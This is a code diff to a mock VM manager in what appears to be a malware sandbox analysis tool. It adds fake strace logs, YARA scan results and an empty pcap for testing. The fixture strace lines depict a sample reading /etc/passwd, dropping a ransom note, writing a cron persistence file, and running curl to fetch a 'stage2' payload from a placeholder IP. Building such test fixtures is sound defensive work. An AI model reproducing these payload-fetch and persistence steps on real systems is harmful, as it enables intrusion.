@@ -584,26 +584,42 @@ class MockVMManager(VMBackend):
         return True
 
     MOCK_STRACE = {
-        "/tmp/strace.log.1234": [
+        "strace.1234": [
             '10:00:00.000100 execve("/malware_sample", ["/malware_sample"], 0x7ffd0 /* 9 vars */) = 0',
             '10:00:00.000400 openat(AT_FDCWD, "/etc/passwd", O_RDONLY|O_CLOEXEC) = 3',
             '10:00:00.000900 openat(AT_FDCWD, "/tmp/DECRYPT_FILES.txt", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 4',
+            '10:00:00.001100 openat(AT_FDCWD, "/etc/cron.d/updater", O_WRONLY|O_CREAT|O_TRUNC, 0644) = 5',
             '10:00:00.001200 vfork() = 1240',
             '10:00:00.003000 connect(5, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("203.0.113.10")}, 16) = -1 ENETUNREACH',
         ],
-        "/tmp/strace.log.1240": [
+        "strace.1240": [
             '10:00:00.001300 execve("/usr/bin/curl", ["curl", "-s", "http://203.0.113.10/stage2"], 0x7ffd1 /* 9 vars */) = 0',
             '10:00:00.001800 connect(3, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("203.0.113.10")}, 16) = -1 ENETUNREACH',
         ],
     }
 
+    # an empty but valid pcap (global header only)
+    EMPTY_PCAP = bytes.fromhex("d4c3b2a1020004000000000000000000ffff000001000000")
+
     async def run_command(self, vm_name, command, shell="/bin/sh"):
-        if command.startswith("ls /tmp/strace.log"):
-            return " ".join(self.MOCK_STRACE)
-        if command.startswith("cat /tmp/strace.log"):
-            return "\n".join(self.MOCK_STRACE.get(command.split()[-1], []))
+        import shlex
+        if command.startswith("ls -1 "):
+            return "\n".join(["rules.yarc", "sample", *self.MOCK_STRACE])
+        if command.startswith("cat ") and "/strace." in command:
+            name = shlex.split(command)[1].rsplit("/", 1)[-1]
+            return "\n".join(self.MOCK_STRACE.get(name, []))
+        if command.startswith("stat -c %s"):
+            return str(len(self.EMPTY_PCAP))
+        if command == "command -v yara":
+            return "/usr/bin/yara"
         if "strace" in command:
             return "execve('/bin/ls', ['ls'], 0x7ffd989c8d30) = 0\nopenat(AT_FDCWD, '.', O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY) = 3"
+        if "yara -C" in command:
+            pid = command.rsplit(" ", 2)[-2] if command.endswith("2>/dev/null") else command.split()[-1]
+            if pid == "1234":
+                return ('suspicious_process [description="Matched a suspicious pattern in memory",author="YEMU"] 1234\n'
+                        '0x10000:$s1: 58 50 45 4e 44 41 54 41\n0x10500:$s2: malicious_function_name')
+            return ""
         if "yara" in command and "/proc" in command:
             return """
 suspicious_process [malware,stealer] /proc/1234/mem
@@ -642,6 +658,9 @@ packer_match [packer] /proc/5678/mem
         return True
 
     async def pull_file(self, vm_name, guest_path, local_path):
+        if guest_path.endswith(".pcap"):
+            with open(local_path, "wb") as f:
+                f.write(self.EMPTY_PCAP)
         return True
 
 
